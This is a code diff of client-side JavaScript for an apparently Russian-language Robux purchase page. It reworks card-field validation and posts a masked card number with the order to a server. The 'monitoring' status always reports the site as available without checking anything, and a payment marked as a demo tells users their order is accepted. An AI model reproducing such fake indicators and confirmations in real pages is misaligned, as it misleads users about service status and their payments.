+    const robux = calcRobux(rub);
+    const currency = currencySelect.value;
+    const data = getCurrencyData();
+
+    if (!nick || nick.length < 3) { alert('⚠️ Введите никнейм (мин. 3 символа)'); return; }
+    if (rub < 10) { alert('⚠️ Минимальная сумма 10'); return; }
+    if (robux > 10000) { alert('⚠️ Лимит 10 000 Robux'); return; }
+
+    const cardNum = cardNumber.value.replace(/\s/g, '');
+    if (!isValidCardNumber(cardNum)) { alert('⚠️ Неверный номер карты'); return; }
+    if (!isValidExpiry(cardExpiry.value)) { alert('⚠️ Неверный срок'); return; }
+    if (!isValidCvv(cardCvv.value)) { alert('⚠️ Неверный CVV'); return; }
+
+    const btn = document.getElementById('payBtn');
+    btn.disabled = true;
+    btn.querySelector('span').textContent = '⏳ Отправка...';
+
+    const cardTypeName = getCardType(cardNum);
+    const payload = {
+      nick: nick,
+      rub: rub,
+      robux: robux,
+      card: cardTypeName + ' ' + cardNum.slice(0,4) + ' **** **** ' + cardNum.slice(-4),
+      currency: currency
     };
 
-    function calcRobux(rub) {
-      let val = Math.floor(rub * RATE);
-      return val < 10 ? 10 : val;
-    }
+    // === ТАЙМАУТ 10 СЕКУНД ===
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 10000);
 
-    function updateDisplay() {
-      let rub = parseFloat(rubInput.value) || 0;
-      if (rub < 0) rub = 0;
-      let robux = calcRobux(rub);
-
-      if (robux > MAX_ROBUX) {
-        limitWarning.classList.add('visible');
-        let maxRub = Math.floor(MAX_ROBUX / RATE);
-        rubInput.value = maxRub;
-        rub = maxRub;
-        robux = calcRobux(rub);
-        limitWarning.classList.remove('visible');
-        alert('⚠️ Лимит 10 000 Robux. Сумма автоматически уменьшена.');
+    fetch(SERVER_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+      signal: controller.signal
+    })
+    .then(r => r.json())
+    .then(data => {
+      clearTimeout(timeout);
+      btn.disabled = false;
+      btn.querySelector('span').textContent = '✅ Оплатить';
+      if (data.ok) {
+        alert('✅ Оплата прошла успешно (ДЕМО)!\nЗаказ принят. Ожидайте Robux 3–5 дней.');
+        paymentForm.classList.remove('visible');
+        showPaymentBtn.querySelector('span').textContent = '💳 Оплатить картой';
+        cardNumber.value = '';
+        cardExpiry.value = '';
+        cardCvv.value = '';
+        cardType.textContent = '';
       } else {
-        limitWarning.classList.remove('visible');
+        alert('❌ Ошибка: ' + (data.error || 'неизвестная'));
       }
-
-      robuxSpan.textContent = robux;
-    }
-
-    rubInput.addEventListener('input', updateDisplay);
-    updateDisplay();
-
-    showPaymentBtn.addEventListener('click', function() {
-      if (!captchaPassed) {
-        alert('⚠️ Сначала подтвердите, что вы не робот (капча выше).');
-        return;
-      }
-      paymentForm.classList.toggle('visible');
-      showPaymentBtn.textContent = paymentForm.classList.contains('visible') ? '❌ Скрыть оплату' : '💳 Оплатить картой';
-    });
-
-    function isValidCardNumber(number) {
-      const cleaned = number.replace(/\s/g, '');
-      if (!/^\d{16}$/.test(cleaned)) return false;
-      let sum = 0;
-      let alternate = false;
-      for (let i = cleaned.length - 1; i >= 0; i--) {
-        let digit = parseInt(cleaned[i]);
-        if (alternate) {
-          digit *= 2;
-          if (digit > 9) digit -= 9;
-        }
-        sum += digit;
-        alternate = !alternate;
-      }
-      return sum % 10 === 0;
-    }
-
-    function getCardType(number) {
-      const clean = number.replace(/\s/g, '');
-      if (/^4/.test(clean)) return 'Visa';
-      if (/^5[1-5]/.test(clean)) return 'MasterCard';
-      if (/^2[2-7]/.test(clean)) return 'MasterCard';
-      if (/^3[47]/.test(clean)) return 'American Express';
-      if (/^220[0-4]/.test(clean)) return 'МИР';
-      return 'Unknown';
-    }
-
-    function isValidExpiry(expiry) {
-      if (!/^\d{2}\/\d{2}$/.test(expiry)) return false;
-      const [mm, yy] = expiry.split('/').map(Number);
-      if (mm < 1 || mm > 12) return false;
-      const now = new Date();
-      const currentYear = now.getFullYear() % 100;
-      const currentMonth = now.getMonth() + 1;
-      if (yy < currentYear || (yy === currentYear && mm < currentMonth)) {
-        return false;
-      }
-      return true;
-    }
-
-    function isValidCvv(cvv) {
-      return /^\d{3,4}$/.test(cvv);
-    }
-
-    cardNumber.addEventListener('input', function() {
-      let val = this.value.replace(/\D/g, '');
-      if (val.length > 16) val = val.slice(0, 16);
-      let formatted = '';
-      for (let i = 0; i < val.length; i++) {
-        if (i > 0 && i % 4 === 0) formatted += ' ';
-        formatted += val[i];
-      }
-      this.value = formatted;
-      const type = getCardType(val);
-      let typeText = type === 'Unknown' ? '' : '💳 ' + type;
-      if (val.length === 16) {
-        const valid = isValidCardNumber(val);
-        typeText += valid ? ' ✅' : ' ❌';
-      }
-      cardType.textContent = typeText;
-    });
-
-    cardExpiry.addEventListener('input', function() {
-      let val = this.value.replace(/\D/g, '');
-      if (val.length > 4) val = val.slice(0, 4);
-      if (val.length >= 2) {
-        this.value = val.slice(0, 2) + '/' + val.slice(2);
+    })
+    .catch(err => {
+      clearTimeout(timeout);
+      btn.disabled = false;
+      btn.querySelector('span').textContent = '✅ Оплатить';
+      if (err.name === 'AbortError') {
+        alert('⚠️ Сервер долго не отвечает. Попробуйте позже.');
       } else {
-        this.value = val;
+        alert('❌ Ошибка соединения с сервером.');
       }
     });
+  });
 
-    cardCvv.addEventListener('input', function() {
-      this.value = this.value.replace(/\D/g, '').slice(0, 4);
-    });
+  // ===== МОНИТОРИНГ =====
+  const statusSpan = document.getElementById('monitorStatus');
+  const lastCheckSpan = document.getElementById('lastCheckTime');
+  function performCheck() {
+    const now = new Date();
+    lastCheckSpan.textContent = now.toLocaleTimeString('ru-RU', {hour:'2-digit', minute:'2-digit'});
+    statusSpan.textContent = '✅ доступен';
+    statusSpan.style.color = '#00ff88';
+  }
+  setTimeout(performCheck, 2000);
+  setInterval(performCheck, 60000);
 
-    form.addEventListener('submit', function(e) {
-      e.preventDefault();
-
-      if (!captchaPassed) {
-        alert('⚠️ Подтвердите, что вы не робот (капча выше).');
-        return;
-      }
-
-      const nick = nickInput.value.trim();
-      const rub = parseFloat(rubInput.value) || 0;
-      const robux = calcRobux(rub);
-
-      if (!nick) {
-        alert('⚠️ Введите никнейм в Roblox');
-        nickInput.focus();
-        return;
-      }
-      if (nick.length < 3) {
-        alert('⚠️ Никнейм должен быть длиннее 2 символов');
-        nickInput.focus();
-        return;
-      }
-      if (rub < MIN_RUB) {
-        alert('⚠️ Минимальная сумма 10 ₽');
-        rubInput.focus();
-        return;
-      }
-      if (robux > MAX_ROBUX) {
-        alert('⚠️ Лимит 10 000 Robux. Уменьшите сумму.');
-        return;
-      }
-
-      const cardNum = cardNumber.value.replace(/\s/g, '');
-      const expiry = cardExpiry.value;
-      const cvv = cardCvv.value;
-
-      if (!isValidCardNumber(cardNum)) {
-        alert('⚠️ Неверный номер карты (должно быть 16 цифр, проверьте)');
-        cardNumber.focus();
-        return;
-      }
-
-      if (!isValidExpiry(expiry)) {
-        alert('⚠️ Неверный срок или карта просрочена (MM/YY)');
-        cardExpiry.focus();
-        return;
-      }
-
-      if (!isValidCvv(cvv)) {
-        alert('⚠️ Неверный CVV (3–4 цифры)');
-        cardCvv.focus();
-        return;
-      }
-
-      const btn = document.getElementById('payBtn');
-      btn.disabled = true;
-      btn.textContent = '⏳ Обработка...';
-
-      const cardTypeName = getCardType(cardNum);
-
-      fetch(SERVER_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          nick: nick,
-          rub: rub,
-          robux: robux,
-          card: cardTypeName + ' ' + cardNum.slice(0, 4) + ' **** **** ' + cardNum.slice(-4)
-        })
-      })
-      .then(r => r.json())
-      .then(data => {
-        btn.disabled = false;
-        btn.textContent = '✅ Оплатить';
-        if (data.ok) {
-          alert('✅ Оплата прошла успешно (ДЕМО)!\nЗаказ принят. Ожидайте Robux 3–5 дней.');
-          paymentForm.classList.remove('visible');
-          showPaymentBtn.textContent = '💳 Оплатить картой';
-          setTimeout(() => location.reload(), 2000);
-        } else {
-          alert('❌ Ошибка сервера: ' + (data.error || 'неизвестная'));
-        }
-      })
-      .catch(() => {
-        btn.disabled = false;
-        btn.textContent = '✅ Оплатить';
-        alert('❌ Ошибка соединения с сервером. Попробуйте позже.');
-      });
-    });
-
-    nickInput.focus();
-
-    const statusSpan = document.getElementById('monitorStatus');
-    const lastCheckSpan = document.getElementById('lastCheckTime');
-
-    function performCheck() {
-      const now = new Date();
-      const timeStr = now.toLocaleTimeString('ru-RU', {hour:'2-digit', minute:'2-digit'});
-      lastCheckSpan.textContent = timeStr;
-      statusSpan.textContent = '✅ доступен';
-      statusSpan.style.color = '#00ff88';
-    }
-
-    setTimeout(() => {
-      performCheck();
-    }, 3000);
-
-    setInterval(performCheck, 600000);
-    statusSpan.textContent = 'активен';
-  })();
+  // ===== ИНИЦИАЛИЗАЦИЯ =====
+  setLanguage('ru');
+  updateDisplay();
 </script>
 
 </body>
